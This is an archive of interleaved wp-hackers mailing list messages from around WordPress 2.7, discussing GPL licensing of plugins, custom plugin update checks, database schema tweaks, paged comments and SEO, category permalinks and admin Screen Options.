"Works under the GPLv2 are only compatible with the GPLv3 if they are  
upgraded manually by the copyright holder(s), or if the work was  
originally licensed in the manner section 9 of the GPLv2 described:

If the Program specifies a version number of this License which  
applies to it and "any later version", you have the option of  
following the terms and conditions either of that version or of any  
later version published by the Free Software Foundation."

Is this the case for WordPress?

Lynne,

The GNU GPL license is very specific on plugins.  I'll include the text so
that there's no misunderstanding here.

*If a program released under the GPL uses plug-ins, what are the
requirements for the licenses of a plug-in?It depends on how the program
invokes its plug-ins. If the program uses fork and exec to invoke plug-ins,
then the plug-ins are separate programs, so the license for the main program
makes no requirements for them.If the program dynamically links plug-ins,
and they make function calls to each other and share data structures, we
believe they form a single program, which must be treated as an extension of
both the main program and the plug-ins. This means the plug-ins must be
released under the GPL or a GPL-compatible free software license, and that
the terms of the GPL must be followed when those plug-ins are distributed.If
the program dynamically links plug-ins, but the communication between them
is limited to invoking the 'main' function of the plug-in with some options
and waiting for it to return, that is a borderline case.*
If

I said nothing about the output of a program (which is also covered in the
text of the license, but that doesn't apply to this discussion).  Code
written in PHP doesn't apply.  PHP isn't under the GNU GPL license anymore,
for the very reason of the contradictions in writing code with it.  Same
with Apache.  (Neither WordPress nor its plugins require Apache to run
anyway.)  Remember, Open Source != GNU GPL.  There are many open source
licenses available, this is just one of them.

-----------
This is not correct. The GPL is all about distribution and simply using GPL
software does not mean that anything you develop to work with it must be
GPL. The output of GPL'd code is not covered by the license, only the source
code itself is. So, if you use WordPress source code in a plugin or theme
then the plugin or theme must be GPL version 2, the same as WordPress.
However, simply combining PHP code with a WordPress function call may not
necessarily mean that a theme or plugin must be GPL. There are two opposing
schools of thought on that issue and neither is wrong - there simply is no
case law to establish whether using a function creates a derivative work.

Then, to make matters more complicated, the GNU/GPL recognises "fair use".
Some themes comprise templates that are made up of hundreds of lines of HTML
and custom PHP, with only a few lines for the loop, for example, and these
may fall under fair use laws. Fair use does not require that the work is
licensed GPL.

If you use your argument that software that is dependent on parent software
to run must inherit the license of the parent then every webpage would be
under the Apache (or other server software) license and all PHP code would
be using the PHP license. This simply does not hold true.

You also do not have to agree to anything when you simply use GPL code. The
license imposes obligations when you modify and/or distribute the code but
agreement is not part of the GPL. Of course, you only have the right to use
the GPL'd code under the terms of the license.

Some people use it as a simple way to temporarily "hide" a live site's home
page from casual surfers or from Google before a site is launched.

I don't do that, but I know others that do.

I agree Michael, the GNU/GPL is specific about plugins, however it uses the
term "plugins" differently to WordPress. The GNU/GPL statement about plugins
applies to compiled code. In compiled code the end result is a binary.
WordPress does not use compiled code and does not produce binaries. The
GNU/GPL is less clear about interpreted code, which is why there is still so
much debate about what makes a work derivative.

Disclaimer: IANAL, and I am also a strong supporter of the GPL. I do,
however, recognise that there are a lot of grey areas when the GPL is
applied to scripting languages and interpreted code which is why I consider
it wrong to say everything is derivative and therefore must be GPL. Its just
plain not that simple.

My current site is based on wp 2.2.
I customised it so that each web page consists of a wordpress PAGE,then 
underneath there are posts. The two are synchronised using category for 
each page.
The purpose was to enable each menu link (Visitors, 
Fleets,Juniors,Members etc) to display a fixed introduction at the top, 
followed by relevant posts.
(sorry, it's a bit hard to explain, but see http://budworthsc.org.uk/ 
makes it clearer!)

Now I am thinking that Wordpress has moved on so far since 2.2 to 2.7 
that I ought to really update the site - there is the new taxonomy 
stuff, sticky posts and all other good stuff.

The site has a large menu structure, each menu or submenu link shows 
fixed item followed by associated posts. I suppose I am currently using 
categories and pages a bit like a different taxonomy for each web page, 
but that seems even more complex!
I may well be making this over-complex, so any advice gratefully received!

For this I use the Maintenance Mode plugin [1], edited with my splash page
HTML instead of the default 'maintenance-mode_site.php' output. It works
really well actually, giving me a splash page for normal visitors and the
actual site for logged in admins.

Message-ID: <5a1dad880812141746x7bc9ed39n5a5505ef4dedf89a@mail.gmail.com>

Hey all,
It was discussed a while ago about plugins being hosted on private websites
(non-WP.org), and still having the update functionality of WP.org hosted
plugins. For 2.8, would it be possible to perhaps have this functionality
added?

I was looking through 'update.php' and noticed that the WordPress update
script just checks against a URL, in this case on wordpress.org, but
couldn't we introduce an element into the main plugin header, where author
etc information is kept, with an alternative URL? That would mean the plugin
author could just upload a txt file perhaps which had the current stable
plugin version, which WP can check against instead of api.wordpress.org?

Any thoughts?

If a plugin wants a non-wordpress.org update check, Then theres nothing to
stop it from doing so whilst its activated through filters, I'm undecided on
support for a plugin header though, I can think of things to both sides..
personally leaning towards a "No" myself (But i'll leave my reasoning for
later).

If a plugin is activated, and wants to check somewhere else, something like
this could be used:

add_filter('pre_update_option-update_plugnis', 'func_update');

function func_update($current) {
  if ( ! is_array($current->response) ) return;
  $file = plugin_basename(__FILE__);
  $body = wp_remote_post('my-url', array('plugin' => $file ) );
  $res = @unserialize($body['body']);
  if ( false !== $res ) {
    $current->response[ $file ] = $res;
  }
  return $current;
}

Just as long as $res was the same format as what the .org api returns, It
should be transparent to the end user, and to WordPress.

Check into the 'wp_insert_post_data' filter, which gets all the post
data including the post slug, right after the post slug has been
incremented but before it's actually updated in the database.

As a side note, you can create a maintenance.php in wp-content/ and
create a .maintenance file in your WordPress directory to do the same
sort of thing (as of 2.7), however this blocks it for all users if I
remember correctly.

Ah..... I've only just realised, in pre-2.7 the activation hook isnt run on
the error scrape window, So the error from die() is not shown.

I've been running trunk for too long.. I forget what old versions are like..

register_activation_hook(__FILE__, 'myplugin_activate');
if( isset($_GET['action']) && 'error_scrape' == $_GET['action']) {
myplugin_activate(); //for pre-2.7 compat

Yes, that's one idea, but then I would need a separate template for each 
page/category, and there are about 50 of them. I also want future 
peopple to be able to maintain site from within the admin pages, just 
using wordpress post/page entries.
Since most of pages are same format, i only have a few template pages at 
present, and if the admin adds a page and category, it automatically 
appears on the menus etc. in the right place (provided they set the parent!)

I am sure there are taxonomy functions to get the page associated with a 
category, then the posts, probably in a second loop = I previously 
rolled my own, but of course the taxomnomy changes have messed that up!

This plugin might do what you ask.
I haven't used myself, it but the description fits
http://wordpress.org/extend/plugins/page2cat/

"This plugin will let you setup connection between pages and
categories, in order to display the page content like a "header" for
your category archive (theme tweak required). By popular demand,
version 2.5 also ships with a shortcode like [catlist] that allows to
display a list of posts from a certain category inside a post or a
page."



Hope that helps.

Mike

Hey All,

I've been reviewing ways to make the WP database have a smaller  
footprint (and better performance), and am looking at the following  
types of changes (these ALTER statements are against the 2.7 schema).

ALTER TABLE `comments`
   CHANGE COLUMN `comment_author_IP` `comment_author_IP` char(15) NOT  
NULL default '', /* Possibly not because of IPv6 */
   CHANGE COLUMN `comment_approved` `comment_approved` char(4) NOT  
NULL default '1', /* Current values are 0, 1, and spam ... we can't  
use enum() because of 0 and 1 */
   CHANGE COLUMN `comment_type` `comment_type`  
enum('','all','comment','pingback','trackback') NOT NULL default '',
   CHANGE COLUMN `comment_date` `comment_date` timestamp NOT NULL  
default CURRENT_TIMESTAMP,
   CHANGE COLUMN `comment_date_gmt` `comment_date_gmt` timestamp NOT  
NULL,
   DROP INDEX `comment_approved`;

ALTER TABLE `links`
   CHANGE COLUMN `link_visible` `link_visible` enum('Y', 'N') NOT NULL  
default 'Y';

ALTER TABLE `options`
   CHANGE COLUMN `autoload` `autoload` enum('yes', 'no') NOT NULL  
default 'yes';

ALTER TABLE `posts`
   CHANGE COLUMN `post_status` `post_status`  
enum('publish','draft','inherit','future','static', 'pending',  
'attachment','object', 'private') NOT NULL default 'publish',
   CHANGE COLUMN `comment_status` `comment_status`  
enum('open','closed') NOT NULL default 'open',
   CHANGE COLUMN `post_type` `post_type`  
enum('post','attachment','page') NOT NULL default 'post',
   CHANGE COLUMN `post_date` `post_date` timestamp NOT NULL default  
CURRENT_TIMESTAMP,
   CHANGE COLUMN `post_date_gmt` `post_date_gmt` timestamp NOT NULL,
   CHANGE COLUMN `post_modified` `post_modified` timestamp NOT NULL,
   CHANGE COLUMN `post_modified_gmt` `post_modified_gmt` timestamp NOT  
NULL;

ALTER TABLE `term_taxonomy`
   CHANGE COLUMN `taxonomy` `taxonomy`  
enum('category','link_category','post_tag') NOT NULL default '';

ALTER TABLE `users`
   CHANGE COLUMN `user_pass` `user_pass` char(34) NOT NULL;

I'm looking for thoughts and/or additional suggestions?  None of the  
above schema changes should require code changes but will make indexes  
smaller etc ...

Thank You,
Ryan Lowe

You could also use the category_description for the blerb on the top  
before the list, assuming they were long enough and not being used  
elsewhere already.

Subject: [wp-hackers] Bug in 2.7 ? => error message on plugin activation,
	how to ?
Message-ID: <8810a71a0812150627kadb2dedj48589126fe9fb163@mail.gmail.com>

DD32, well trunk may have some bugs, but 2.7 also have ...

Apparently in 2.7 when calling plugins.php with error_scrape, most of the wp
api is not loaded anymore, leading to this kind of message :

Plugin could not be activated because it triggered a *fatal error*.
Sorry, but you can't run this plugin.
Your PHP version is '5.2.5', at least version '6.2.0' required. (well that
is for test purpose !)
*Fatal error*: Call to undefined function deactivate_plugins() in *
C:\Vn\wp27\wp-content\plugins\mailpress*

And the result is that the Plugin gets ACTIVATED !!!!

What my code looks like :

add_action('activate_myplugin.php', 'install');
if (isset($_GET['action']) && ('error_scrape' == $_GET['action']))
{
    install(false,false);
    deactivate_plugins($_GET['plugin']);
    die();
}

    install($install=true, $trigger=true) {

        $min_ver_php = '6.2.0';
        $m = array();

        if (version_compare(PHP_VERSION, $min_ver_php, 'ge')) ;
        else
        {
            $install = false;
             $m[] .= sprintf(__('Your %1$s version is \'%2$s\', at least
version \'%3$s\' required.'), 'PHP', PHP_VERSION, $min_ver_php );
        }

        if ($install)     include ('install.php');
        else
        {
            $err  = __("Sorry, but you can't run this plugin.");
            $err .= '<br/>' . implode('<br/>',$m);
//trigger a fatal error
            if ($trigger) trigger_error('', E_USER_ERROR);
            else echo $err;
        }
    }

I am going to make a plugin test and post a ticket.

I also had a message like this one :
Fatal error: Call to undefined function wp_get_current_user() in
C:\Vn\wp27\wp-includes\capabilities.php on line 920 (ticket #8624)

Two cents from an SQL noob :

Regarding changes you propose form comments.comment_type, 
posts.post_status, posts.comment_status, posts.post_type, term_taxonomy.
taxonomy, for which you suggest an enum() :
I think that not enforcing a short list of types allows for flexibility. 
For instance, anyone can make a plugin that implements new type of 
comments or new type of posts, etc... without having to modify the DB 
structure.

(This said, such a plugin could start off by ALTERing the tables and 
remove such enum() on activation if needed?)

My specific thoughts echo what Ozh noted: the term_taxonomy table  
needs to support an arbitrary number of values to effectively support  
the extensibility that makes WordPress an application platform as well  
as blog system.

More generally, however, I'm split about how important it is to  
convert any field to enum. Yes it makes tables smaller, but it doesn't  
change the index size (indexing x different varchar values is the same  
as indexing an equal number of enum values). And without more  
efficient indexes, we're unlikely to see any performance gain.

I'm guessing the core developers have come to a similar conclusion.  
You can compare the number of enums in 1.5 vs. 2.7 here:

I second that. I loath the image uploader. I hate that it used to work  
fine until someone decided to slap jquery all over it and make it slow  
and totally unusable. One shouldn't have to use a plugin for a basic  
function that should work reasonably well out of the box.

No, this is very specifically not the case for WordPress. I checked

The uploading part is pretty cool I think. I wish Gmail for instance would 
use something similar.

There is still room for improvements, though. I've just written an article 
with several screenshots and, while it's been a breeze to upload all the 
images and get them thumbnailed in one click, inserting them one by one in 
the post has been a real infuriating pain because the damn lightbox closes 
when you click "Insert into post", so you have to reopen it.

I think it should:
- auto close when clicking on "Insert" if there are no other images in the 
current gallery
- wait for your manual closing otherwise.

I'm working on a new system for this -- part of a plugin "common core"  
I'm developing.  The last unfinished part is the version checking --  
I've figured out a full integration into the existing WP interface --  
still working out kinks in the actual act of checking.

It's also going a bit slow because certain aspects of the code must,  
by their nature, be rock-solid before any public release, as it's  
difficult to make changes later....

I'll keep you posted, though I'll say now that development has  
distinctly slowed over the holidays.  Keep an eye out for "Strider  
Core" plugins. :)

different pages and will punish you on the assumption that you are
messing with them.

If you do have two urls with the same essential content make sure
there are *at least* trivial differences between the two versions
(maybe highlight the active category somehow, or just make sure some
random sidebar content is different).

I love the media uploader, but I mostly use it for galleries.

I recall that in one of the early crazyhorse designs, there was a
"Media" sidebar box, where somebody could presumably see the
thumbnails of the media attached to the post, and then click them to
insert the code directly into the post. That idea should really make a
comeback. Then, you could go into the uploader, upload all your pics,
come back to the post, and click them whenever you wanted to insert
them.

Mike,
I looked at this plugin when making my site under wp 2.1, but in the end 
used the "Page Category Organiser" ( now called "Page Category Plus") by 
yellowSwordfish - can't remember why I picked that one now!

However, it relied on the old category tables so will have to try latest 
version to see if it works with taxonomy tables and WP2.7 - 
unfortunately yellowswordfish no longer maintains it :(
I will check out latest of the page2cat by pixline as well.

I still suspect there are some wp 2.7 functions that would make it easy, 
but there are so many now it's hard to know which one/where to start! I 
still havent quite got my head around the taxonomy structure, as in my 
upgraded database the term_id and term_taxonomy_id in wp_term_taxonomy 
are always the same! I suspect that using wp2.7 features they would then 
diverge, but can't understand what controls it...and therefore which one 
to focus on!

Thanks
Chris

This is a specious argument, at best. There is no difference between
compiled code and interpreted code from a legal point of view.

Furthermore, the GPL primarily applies to *source code*.

Message-ID: <20081215123805.7aa2ca5b@montecarlo.grandprix.int>

When it comes to SEO duplicate Title/Meta Tags on many pages isn't what
you want.

WordPress 2.7 introduced me to a new URL comment-page-x
The problem with this is that the title and the meta description are the
same for each article no matter what page your are on.
So the following examples have the same title and meta description
http://blog.example.com/article
http://blog.example.com/article/comment-page-1
http://blog.example.com/article/comment-page-2

Is there a way to determine on which page I am? Like you have the
function is_paged() to tell me I'm dealing with a paged index page.
That way I can rewrite the title and the description.

Isn't this bad for SEO?  We now have a post with multiple pages, but  
the post content is repeated over multiple URLs.  This will screw up  
search engines, as well as site stats (popular posts will end up  
"splitting the vote" between comment-page-1, comment-page-2, comment- 
page-3, etc...)

Subject: [wp-hackers] paged comments problem
Message-ID: <E926CE42-84D0-46AA-A29A-CDEEECAD6EA3@striderweb.com>

Hi all --

I use a theme that is a mildly modified version of the Default theme  
(probably the 2.5 Default theme).  i want to update so I'm using the  
new WP 2.7 paged comments, so I replaced my old comments.php with the  
one from the new 2.7 Default theme.  Should be good, right?  Wrong.

On my test server I have a post with 11 comments (one of which is a  
threaded reply to another).  I set the Options to break comments at  
every 10.  The comments all show on one page.  Okay.

Now I add a comment.  The page reloads and I see no comments, but I  
see the "older comments" navigation link.  When I look at the address  
bar, I see that I'm on comment-page 11 !  Oooops!  If I navigate to  
the post page sans "comment-page" bit, comments show as expected --  
paged and all.

Am I doing something wrong, or is this a bug?  Again, there are minor  
changes to the overall theme (the header is modified graphically,  
etc.), but this is the exact comments.php from WP 2.7 Default theme.

Stephen

For some of us,  end-user functionality trumps SEO.   Some of us don't
actually CARE about search engines hardly at all.   SEO is NOT the be-all
and end-all of the web.

Hmm, good point Stephen.
You're absolutely right, I didn't think of it like that.

I guess by modifying the robots.xt to disallow the search of
comment-page-x we could overcome this.

That's not the greatest solution, as now you would be losing the  
content of the comments, one of the main considerations of SEO to  
begin with. Adding a rel="nofollow" to the links that goes to the sub- 
pages might do the trick, as long as the link to the main post page  
isn't nofollowed.

When you do that, Google won't spread the "juice" from the main post  
page, but juice from the secondary pages will flow up toward the  
primary page.

Remember, nofollow doesn't mean noindex. Google WILL index the  
secondary comments pages and give them their own pagerank, independent  
of the nofollow referer. Thus, any benefit that they might have should  
be transfered to the page that you want your pagerank to rest upon.

No it isn't, but it certainly matters to some.

I was thinking in terms of using a GET to show different comment pages:

example.com/2008/mypost/?commentpage=2

Drawbacks to that as well, I'm sure, but I'm don't see them.

Wouldn't hurt end-user usability, unless you suspect many readers are  
directly typing in URLs to particular comment pages.

I've been using the "paged comments" plugin on my blog for a while  
now, which uses similar URLs to those produced by the new WP comment  
paging, and one thing I noticed was that it made my stats all wonky  
because hits on popular posts were being spread out among several  
comment-page URLs.  The more comment pages, the farther **down** in  
the stats!

Dan's suggestion of nofollow-ing the comment-page URLs is a good one,  
but only a partial fix.

Thanks Dan for this info, I'm a complete noob when it comes to SEO.

If I understand correctly by adding the rel="nofollow" to the links
Older Comments and Newer Comments it could increase the pagerank of the
main page?

But this won't take care of the problem of duplicate Titles and Meta
Descriptions, correct? What if you could add 
<META NAME="ROBOTS" CONTENT="NOINDEX, FOLLOW">
on the pages with the comment-page url? Would that be helpful?

Cool.  Good to know.  Does anyone know how well Google et al handle  
things like this?  If they see example.com/2008/mypost/ , will they  
also index the comments on example.com/2008/mypost/?cpage=2 ???

Actually, when paged comments are set to show the last page by
default, page 1 is not the permalink page, it's the page with the
oldest comments. So you can't assume that an empty cpage query
variable is page 1.

Peter, then engines wouldn't spider the comments? I think paged  
comments are generally a bad idea. Maybe putting all the comments on  
the same page and then hiding some and pagifying using javascript  
would be more optimal.

But if we hide some the engines won't spider the comments either.

You are partially incorrect. You wouldn't be _increasing_ the  
pagerank. You would simply be _not diluting_ it.

I would far rather have the comments pages in separate jQuery Tabs [1], so I
could browse to "example.com/post/#comment-page-1" - this would solve our
SEO problems, keep end user functionality, allow AJAX loading of the
comments (so we aren't loading the pages each time), and would degrade
gracefully without CSS/JS.
jQuery is shipped with WP, and Tabs has been included in the latest version
of jQuery UI (which may be shipped with WP, but not sure).

What are people's thoughts on this? I don't see why this enhancement
couldn't be made as soon as 2.7.1...

Did you also replace your header.php file?
A new piece of code was added for the comments system to work; just add this
just before </head>:

<?php if ( is_singular() ) wp_enqueue_script( 'comment-reply' ); ?>
<?php wp_head(); ?>

wp_head will already be there, but the comment-reply Javascript is new.

Unless you've modified it, I would just replace the whole header.php file,
other fixes have been made since 2.5.

I like this idea much more, but are you saying that jQuery would then  
be a standard payload for any blog using paged comments?  That I don't  
like as much. I don't think that pushing end users into any specific  
javascript framework is fair to any of the others. jQuery users would  
love it. Prototype users? Not so much.

I can understand worrying about the added javascript. I can understand 
thinking that jQuery is actually overkill, that this could be done with 
less javascript. However, I have no problem pushing people to a specific 
javascript framework. We push people to use PHP, we push them to use 
mod_rewrite, etc. At some point the team will probably HAVE to make a 
call and back a specific javascript framework. Now is as good of a time 
as any (in my opinion). I don't care what they choose either, although 
you can almost guarantee it'll be jQuery since that's what they went for 
with the admin section.

Well I was betting on jQuery because of the WP team's choice to use it in
the admin panel (and it's my favourite :P), and I agree Aaron that it can
probably be achieved with much less JS than loading a whole framework.
However, bear in mind the size of the packed jQuery is only 30KB and many
many blogs I have been on already use jQuery for something - it's readily
loaded even for simple effects like Lightboxes.

Perhaps having a checkbox in the admin panel under the new comments section?

The previous_comments_link and next_comments_link functions do.

Although I suspect this is not a problem because WordPress sets the
cpage variable correctly anyway.

Thanks -- I'll check it out.  I figured it was some change in a  
different file, but didn't know how to find it easily.

I'll do a diff of the 2 header.php files and update around my changes.

+ wp-hackers; - www-archive ? time to throw this over to a more  
specific list.

Brief summary: this comes after discussing the short comings of the  
design of WXR's input/output in WP (and whether it can ever really  
cope with XML), and myself (implicitly) volunteering to write an XML  
serializer for PHP 4.

On the subject of an XML serializer, does anyone have much opinion on  
whether it should be streaming or whether it should have a whole tree  
(the latter is inevitably more complex, and brings up the question of  
how to interact with the tree, and I really don't want to implement  
DOM in PHP)? I'd argue for the sake of performance that it should be  
streaming, simply because trying to write any tree structure in PHP  
will be far too expensive. It would, however, be interesting to see  
whether using DOM internally on PHP 5 would be worthwhile in terms of  
performance.

I believe that only the parts that WordPress uses are included with WP,
as jQuery UI is made up of many individual components.

a poorly named variable, several in fact?

example:
link_before
    (string) Text to put before all the links inside the link.
Defaults to (blank). Version 2.7 or later required.

The naming suggests that it goes _before_ the link, when in fact it
only goes _before the text_ of the link.

same can be said for link_after.

I released a plugin some time ago to correct this,
http://wordpress.org/extend/plugins/epage-links/

After all what is a list of links to pages...

it's a list of course, and should be marked up as such - shouldn't it?

Slugs have to be unique. The whole posts table system is based on that.

I was the one to write the patch that was added in the core of 2.7 the  
origional terms were innerbefore and innerafter. before and after are  
outside the link a tags as is the case in other places in the code. If  
I had known there was a system by plugin already I might ha be  
suggested it, it was waiting in the fold of trac since 2.5.

You can add the post to two categories...
the struct will then be:

http://example.com/cat-base/cat-slug/post-slug.html
http://example.com/cat-base/cat-slug2/post-slug.html

right??

you can hack the rewrite to allow you to have it like this:
http://example.com/cat-slug/post-slug.html

Well I wouldn't say my naming structure was that good (blink and
alink!). I assume though that to avoid breaking things it would be
necessary to add something like 'before_link' or 'outer_before_link'.

Could it be brought up again on trac for 2.8 perhaps?

I've been checking out the code in wp-admin/includes/template.php looking
for a hook that will allow me to set the default visibility for admin
"Screen Options" in 2.7 via a plugin. Can anyone point me in the right
direction?

 

Thanks,

You'd have to hack a lot more than the rewrite. The query only
operates on the most specific piece found, I think.

So if you give it both a category and a post slug, it then knows a)
you're pulling a single post (so it uses the single post template) and
b) the post to pull has post-slug X. The category is not used, at all.

This is why if you have a permalink string of %category%/%postname%,
then you can give it ANY category in the URL and still get the same
post back. The category is less specific than the postname, so it's
assuming you want the single post.

Changing this would not be trivial.

Message-ID: <1fa535a70812160834x73f004f4ra436b762d06e99cd@mail.gmail.com>

* Scenario:

You're a plugin author with plugins in the WP Plugin Directory. You
blog about the plugins at your own blog, and you've probably got some
pages on your blog about these plugins too.

* Problem:

You've just updated all your plugins so they're 2.7 compatible, or
maybe you didn't even need to update them but just changed the readme
file to reflect that they do in fact work in 2.7. Now you're going to
have to go and edit all the posts/pages on your blog to reflect these
changes.

* Wouldn't it be nice if:

The various attributes of your plugins were automatically updated on
your blog whenever you commited a change to the WP Plugin Directory
SVN repo?

* How about using WordPress shortcodes to type this into your posts/pages:

"My plugin is compatible with WordPress version [plugin
requires_at_least] and higher. I've successfully tested it up to
version [plugin tested_up_to]."

Voila. All your posts/pages automatically stay up to date with the
details of your plugin in the WP Plugin Directory SVN repo.

* Interested?

I've written a plugin that provides this functionality and I'm looking
for some feedback to see if anyone else finds it useful. Find the
plugin at: <http://lud.icro.us/wordpress-plugin-info/>. The plugin
isn't yet feature complete and I will be updating it over the next few
days, but feel free to take a look.

I have noticed this before and filed it as a
bug<http://trac.wordpress.org/ticket/7187>.
I don't think it's okay to have an infinite number of possible URL
combinations all returning the same content. It should at least redirect to
a single URL with the appropriate category slug.

The problem is that I'm not sure that there a proper fix for that
issue, because the issue is not the one you think it is.

A Permalink string of "/%category%/%postname%" is quite simply
invalid. Why? Because the custom permalink string is supposed to be
specific to a single post, but "category" is a multiple choice option.
More than one category can be associated with a post. So which one do
you choose as the canonical category for the permalink? Sure, right
now, it generates that permalink by using whatever the first category
in the list is, but that's essentially a luck-of-the-draw thing, with
no real meaning to it.

The real issue is that we allow %category% in permalinks *at all*. If
the system was consistent, "%category%" would simply not be an option
there, period. But too many people seem to use it to eliminate it.

Using category like that is an extremely poor choice for SEO, IMO, and
it also makes your URLs confusing and inconsistent. I would recommend
against using it unless you have no other choice (client wants it and
you can't talk them out of it).

You'll want to drop a javascript in the wp-admin footer - that does  
what you want.

The relevant code from wp-admin/common.js is

	// screen settings tab
	$('#show-settings-link').click(function () {
		if ( ! $('#screen-options-wrap').hasClass('screen-options-open') ) {
			$('#contextual-help-link-wrap').addClass('invisible');
		}
		$('#screen-options-wrap').slideToggle('fast', function(){
			if ( $(this).hasClass('screen-options-open') ) {
				$('#show-settings-link').css({'backgroundImage':'url("images/ 
screen-options-right.gif")'});
				$('#contextual-help-link-wrap').removeClass('invisible');
				$(this).removeClass('screen-options-open');

			} else {
				$('#show-settings-link').css({'backgroundImage':'url("images/ 
screen-options-right-up.gif")'});
				$(this).addClass('screen-options-open');
			}
		});
		return false;
	});

----------------------------------------
It doesn't appear that the condition of the Screen Options tab  
persists from session to session. So dropping a custom jQuery code  
should see which class it has when it executes and set the desired  
action. If you want to persist the status - you could have a simple  
Ajax call to a function in your plugin - that stored the status in a  
Option.

Pretty neat idea.

I might use it myself, I haven't really looked at the plugin that much
to say anything substantial about it. I'll come back on that part :)

What exactly is stopping you from using term descriptions? They would
make it very easy to add the content using the existing category
editing screens and from what I can tell there's no limitations to how
long they can be (it's 'longtext' ). What isn't working?

Admittedly it might be frustrating to create complex content in the
relatively small space that's given for term descriptions in the UI,
but that's more of an inconvenience than a real problem IMHO (at least
compared to keeping pages/categories synced!). You can use the
post/page screen to create your post (you can even use WYSIWYG)  then
just paste it into the term_description field. The small size doesn't
actually stop you from putting full content there.

If you're not doing so already, you should also apply the standard
content filters to the term_description when you display it in your
template, that way it will behave just like a post would (i.e.
automatic paragraphs, [shortcodes] etc. even plugin-based things will
work just like posts) It would look something like (off the top of my
head):

  echo apply_filters('the_content', $cat_details->term_description);

Thanks Tom.... That seems really useless that the Screen Options are not
persistent - I just assumed they would stored in the DB. How handy is it to
have to set your preferences every time you login? Was there any rationale
for making it this way?

To which screen options are you referring?  Which submenus are visible  
in navigation?

Hi - I was referring to the "Screen Options" section in the 2.7 admin area
where you can choose to show or hide the various admin widgets - custom
fields, incoming links, etc.

Personally, I use categories in my URLs, but only apply one category  
to a post. This way both the cat and the slug are unique for SEO  
purposes, and then use tags for all the other topics I want to apply  
to a post.

I forgot about that.

Confusing? Maybe.
Extremely poor choice for SEO? I highly doubt that. If you have descriptive
categories, it's quite the opposite.
If that would be a poor choice for SEO, so would nested pages.


Anyway, if someone gets to an URL that contains a non-existent category
slug, wouldn't it make more sense to issue a 404, instead of serving the
post that has the post slug? Would that check be too expensive?

I can't presume to speak for the core team. And I need to clarify -  
the checkbox that are set within the Screen Options do persist - but  
the visibility of the Screen Options area doesn't.

I'd suggest that the thought was - it isn't something that you'd  
change often after you get it setup to your preferred layout.

The checkboxes persist from session to session and are managed as an  
option -
take a look in wp-admin/includes/template.php

function get_hidden_columns($page) {
	$page = str_replace('.php', '', $page);
	return (array) get_user_option( 'manage-' . $page . '-columns- 
hidden', 0, false );
}

You are aware that parts of URLs are not actually treated as English
words by all major search engines, yesno? The readability of URLs
makes little or no difference in that respect.

> If that would be a poor choice for SEO, so would nested pages.

No, because nested pages can't cause multiple links containing
duplicate content. Using categories in URLs where you can have more
than one category can.

That check would be quite expensive, actually, as it would require
that you verify every "part" of the permalink in a page request. As it
stands now, it merely figures out the most specific part (easy to do)
and looks for a matching result. One database hit instead of several.
No result = 404. No verification of anything needed.

What about nested pages? You can have pages with different parents and the
same slug. Why isn't that expensive?

I just noticed that the checkboxes for the Edit Pages screen are not
persistent. Probably a bug.

I have a client that is constantly changing permalinks, and it's  
driving me nuts. In your opinion, what is the best way to allow  
changes to the permalinks without creating a thousand 404 errors? An  
auto redirect?

I was under the impression at one point that Wordpress keeps track of  
permalink changes in the DB, and automatically redirects. But testing  
proved that one to be not true. Was that a plugin that I was thinking  
about?

We typically use the Redirection plugin (
http://urbangiraffe.com/plugins/redirection/).
It allows you to manually create any redirects you want, and also has an
option to automatically create a redirect when a post's slug changes.

Subject: [wp-hackers] Weird comment paging bug?
Message-ID: <DC79B9CC-DA01-499E-B726-9EEFF02C34AF@striderweb.com>

Hi all --

I've encountered a strange bug:

I have a setup of WP 2.7 on my test server.  No plugins are activated,  
and I'm using the default theme.  (Yes, I wrote about this previously,  
but I thought it was a theme problem -- this is the Default theme now.)

I've set comment paging to break on every 10th comment.  A post has 15  
comments.  I leave a test comment on that post, and am taken to .../ 
comment-page-11/#comment-(number).  There are no comments showing  
because I'm on page 11 and there are only 2 pages worth of comments.

If I hit the "Older Comments" link 9 times I will eventually get to  
the proper page with the most recent comments, but... what the heck is  
going on with the redirect?

Any idea what could cause this?

Stephen

As far as i understand,

you want to hide some dashboard widgets by default.

The dashboard widgets are defined in wp-admin/includes/dashboard.php

so if you want to hide some of the widgets even in the "Screen options", you
will need to hack this file.

Otherwise, the "Screen options" (Show on/off) are stored in the db for each
admin user : see table usermeta column meta_key = metaboxhidden_dashboard

I don't think so.  It's continuing the loop while one can set elem to
its parent element.

Pages are different. Each page URL is individually built and matched
against to start with. So if a page URL matches completely, then
everything else is overridden and the page is directly pulled.

This is actually quite expensive when you scale it up, because if you
have LOTS of pages, then the page permalink URLs list gets quite large
and slow to pull out of the DB. But, since most sites have a low Page
count, it's not expensive enough to mess with.

Okay, actually, that's somewhat simplistic...

There's a flag called use_verbose_page_rules in the rewrite system
that gets invoked whenever you include %postname%, %category%, %tag%,
or %author% in your permalink settings.

When you're not using one of those, then pages are matched like
everything else on the pagename, which makes it quite quick. Pages, in
that case, get matched last, when nothing else works.

When you are using one of those, then it has to build the page URI
list in order to match against them directly, *before* all the other
rules, so that it pulls the matching pages before it matches against
something else inadvertently.

The WP_Rewrite class can be quite complex at times.

Subject: [wp-hackers] getting edit data in entirety before posts go to database
Message-ID: <21048549.post@talk.nabble.com>


am i wrong in thinking that there are no hooks to manipulate entire edits
before they hit the database?

for example; lets say i want to rewrite the way slugs are saved. i'd hook
into the 'name_save_pre' filter, but then i'm isolated to the passed name
with no reference to the rest of the post. how can i get the proper title of
the post without going into the database or using raw post data?

On of the new ideas for 2.8 is the include of create sitemap.xml in the core.
Maybe it is an idea to use the php-class:
http://www.phpclasses.org/browse/package/5031.html

The class is very easy to use. example:
$map = new SiteMap('sitemap.xml');
$map->addPage('http://my-site.com/page.html', 'daily', 1);
$map->addPage('http://my-site.com/page2.html', 'daily', 0.8);
$map->addPage('http://my-site.com/page3.html', 'daily', 0.7);
$map->create();

Sounds like a reasonable idea, Eric.

Do you then create tags that are identical to each of your categories? 
If so, is there any redundancy factor there, or not?

I'm not sure why you are opposed to using the raw post data. You can 
see the entire form the person submitted in $_POST, and it's a 
legitimate way to figure out what's going on in post-save-related hook 
functions.

You might also look at the sanitize_title filter. That lets you 
influence the default slug, without overwriting if someone has 
manually edited the slug (probably a good thing to leave manual edits 
alone).

Subject: [wp-hackers] RSS weirdness in 2.7?
Message-ID: <49492195.3030103@poplarware.com>

Did 2.7 have some changes related to RSS feeds?

The reason I am asking is that a couple of days ago I got a bunch of 
old WP-related messages showing up as new/unread in my RSS reader (I 
read RSS inside Thunderbird and these would be from the Planet WP 
